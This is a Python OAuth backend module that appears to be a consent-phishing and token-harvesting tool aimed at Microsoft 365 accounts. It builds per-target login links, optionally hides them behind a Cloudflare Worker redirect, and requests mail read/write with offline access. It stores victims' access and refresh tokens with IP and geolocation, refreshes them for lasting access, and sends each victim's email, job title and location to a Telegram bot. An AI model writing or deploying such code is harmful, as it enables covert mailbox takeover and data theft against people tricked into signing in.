import uuid
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus, unquote
import requests
import os

from db import SessionLocal, init_db
from models import TenantToken, SavedUser, ConnectInvite


# =========================
# CONFIG
# =========================
CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

# ask Graph explicitly for jobTitle
GRAPH_ME_URL = (
    "https://graph.microsoft.com/v1.0/me"
    "?$select=id,displayName,mail,userPrincipalName,jobTitle"
)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

# optional Cloudflare Worker wrapper, for example:
# https://your-worker-subdomain.workers.dev
CLOUDFLARE_WORKER_BASE_URL = os.environ.get("CLOUDFLARE_WORKER_BASE_URL", "").rstrip("/")

# legacy DB compatibility for tenant_tokens.session_id NOT NULL
DEFAULT_SESSION_ID = "jwt-only"


# =========================
# TELEGRAM ALERT
# =========================
def send_telegram_alert(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram not configured, skipping alert")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }

    try:
        res = requests.post(url, data=payload)
        if res.status_code != 200:
            print(f"❌ Telegram error: {res.text}")
    except Exception as e:
        print(f"❌ Telegram exception: {e}")


# =========================
# TOKEN STORAGE
# =========================
def save_token(user_id, token_data, device_info=None):
    init_db()
    db = SessionLocal()

    try:
        expires_at = int(
            (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
        )

        existing = db.query(TenantToken).filter_by(
            tenant_id=user_id
        ).first()

        if existing:
            existing.access_token = token_data["access_token"]
            existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
            existing.expires_at = expires_at

            if hasattr(existing, "session_id") and not existing.session_id:
                existing.session_id = DEFAULT_SESSION_ID

            if device_info:
                existing.ip_address = device_info.get("ip")
                existing.user_agent = device_info.get("agent")
                existing.location = device_info.get("location")

        else:
            new_row = TenantToken(
                tenant_id=user_id,
                access_token=token_data["access_token"],
                refresh_token=token_data.get("refresh_token"),
                expires_at=expires_at,
                ip_address=device_info.get("ip") if device_info else None,
                user_agent=device_info.get("agent") if device_info else None,
                location=device_info.get("location") if device_info else None
            )

            if hasattr(new_row, "session_id"):
                new_row.session_id = DEFAULT_SESSION_ID

            db.add(new_row)

        db.commit()
    finally:
        db.close()


def get_token(user_id):
    init_db()
    db = SessionLocal()
    try:
        token = db.query(TenantToken).filter_by(
            tenant_id=user_id
        ).first()
        return token
    finally:
        db.close()


# =========================
# SAVED USER SUPPORT
# =========================
def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | None = None):
    init_db()
    db = SessionLocal()

    try:
        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id
            )
            .first()
        )

        if not existing:
            row = SavedUser(
                admin_user_id=admin_user_id,
                user_id=target_user_id
            )
            # only set if your model has the column
            if hasattr(row, "job_title"):
                row.job_title = job_title
            db.add(row)
        else:
            if hasattr(existing, "job_title") and job_title:
                existing.job_title = job_title

        db.commit()
    finally:
        db.close()


# =========================
# INVITE SUPPORT
# =========================
def create_connect_invite(admin_user_id: str):
    init_db()
    db = SessionLocal()

    try:
        invite_token = str(uuid.uuid4())

        invite = ConnectInvite(
            admin_user_id=admin_user_id,
            invite_token=invite_token,
            is_used=False
        )
        db.add(invite)
        db.commit()

        return invite_token
    finally:
        db.close()


def get_connect_invite(invite_token: str):
    init_db()
    db = SessionLocal()

    try:
        invite = (
            db.query(ConnectInvite)
            .filter(ConnectInvite.invite_token == invite_token)
            .first()
        )
        return invite
    finally:
        db.close()


def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = None, job_title: str | None = None):
    init_db()
    db = SessionLocal()

    try:
        invite = (
            db.query(ConnectInvite)
            .filter(ConnectInvite.invite_token == invite_token)
            .first()
        )

        if invite:
            invite.is_used = True
            invite.used_at = int(datetime.utcnow().timestamp())
            if resolved_user_id:
                invite.resolved_user_id = resolved_user_id
            if hasattr(invite, "job_title") and job_title:
                invite.job_title = job_title
            db.commit()
    finally:
        db.close()


# =========================
# HELPERS
# =========================
def wrap_with_cloudflare_worker(target_url: str):
    """
    If CLOUDFLARE_WORKER_BASE_URL is configured,
    return a workers.dev redirect URL like:
    https://your-worker.workers.dev/r?target=<encoded-url>

    Otherwise return the original target_url.
    """
    if not CLOUDFLARE_WORKER_BASE_URL:
        return target_url

    return (
        f"{CLOUDFLARE_WORKER_BASE_URL}/r?"
        f"{urlencode({'target': target_url})}"
    )


def build_authorize_url(state_value: str):
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
        "state": quote_plus(state_value),
        "prompt": "select_account"
    }

    raw_login_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
    wrapped_login_url = wrap_with_cloudflare_worker(raw_login_url)

    print(f"DEBUG: Generated raw_login_url: {raw_login_url}")
    print(f"DEBUG: Generated wrapped_login_url: {wrapped_login_url}")

    return wrapped_login_url


def fetch_graph_identity(access_token: str):
    headers = {"Authorization": f"Bearer {access_token}"}
    res = requests.get(GRAPH_ME_URL, headers=headers)
    data = res.json() if res.content else {}

    resolved_user_id = (
        data.get("userPrincipalName")
        or data.get("mail")
        or data.get("id")
    )

    job_title = data.get("jobTitle")

    return {
        "resolved_user_id": resolved_user_id,
        "job_title": job_title,
        "profile": data
    }


def build_device_info(client_ip: str = None, user_agent: str = None):
    location_str = "unknown"

    if client_ip:
        try:
            loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
            if loc_resp.ok:
                loc = loc_resp.json()
                location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
        except Exception:
            pass

    return {
        "ip": client_ip,
        "agent": user_agent,
        "location": location_str
    }


# =========================
# LOGIN LINK GENERATION
# =========================
def generate_login_link(user_id: str):
    state_value = f"user:{user_id}"
    print(f"DEBUG: Generated state_value: {state_value}")
    return build_authorize_url(state_value)


def generate_org_connect_link(admin_user_id: str):
    invite_token = create_connect_invite(admin_user_id)
    state_value = f"invite:{invite_token}"
    print(f"DEBUG: Generated org invite state_value: {state_value}")
    return build_authorize_url(state_value)


# =========================
# TOKEN EXCHANGE
# =========================
def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
    init_db()

    decoded_state = unquote(state)
    print(f"DEBUG: Decoded state: {decoded_state}")

    token_payload = {
        "client_id": CLIENT_ID,
        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code",
        "client_secret": CLIENT_SECRET
    }

    response = requests.post(TOKEN_URL, data=token_payload)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token exchange failed: {result['error_description']}")

    access_token = result["access_token"]
    identity = fetch_graph_identity(access_token)
    resolved_user_id = identity["resolved_user_id"]
    job_title = identity["job_title"]
    profile = identity["profile"]

    if not resolved_user_id:
        raise Exception("Could not resolve Microsoft user identity from /me")

    device_info = build_device_info(client_ip, user_agent)

    # save token under the REAL Microsoft identity
    save_token(resolved_user_id, result, device_info)

    admin_user_id_for_saved_user = None

    if decoded_state.startswith("user:"):
        requested_user_id = decoded_state.split("user:", 1)[1]
        admin_user_id_for_saved_user = requested_user_id

    elif decoded_state.startswith("invite:"):
        invite_token = decoded_state.split("invite:", 1)[1]
        invite = get_connect_invite(invite_token)

        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            mark_connect_invite_used(invite_token, resolved_user_id, job_title)

    else:
        admin_user_id_for_saved_user = decoded_state

    if admin_user_id_for_saved_user:
        save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)

    email = (
        profile.get("userPrincipalName")
        or profile.get("mail")
        or "unknown"
    )

    message = (
        f"Resolved User ID: {resolved_user_id}\n"
        f"Job Title: {job_title or 'unknown'}\n"
        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
        f"Email: {email}\n"
        f"IP: {client_ip or 'unknown'}\n"
        f"Location: {device_info.get('location', 'unknown')}"
    )

    send_telegram_alert(message)

    return {
        "token_result": result,
        "resolved_user_id": resolved_user_id,
        "job_title": job_title,
        "profile": profile,
        "admin_user_id": admin_user_id_for_saved_user
    }


# =========================
# TOKEN REFRESH
# =========================
def refresh_token(user_id: str):
    token_record = get_token(user_id)

    if not token_record or not token_record.refresh_token:
        raise Exception("No refresh token available. User must re-login.")

    data = {
        "client_id": CLIENT_ID,
        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
        "refresh_token": token_record.refresh_token,
        "grant_type": "refresh_token",
        "client_secret": CLIENT_SECRET
    }

    response = requests.post(TOKEN_URL, data=data)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token refresh failed: {result['error_description']}")

    save_token(user_id, result)
    return result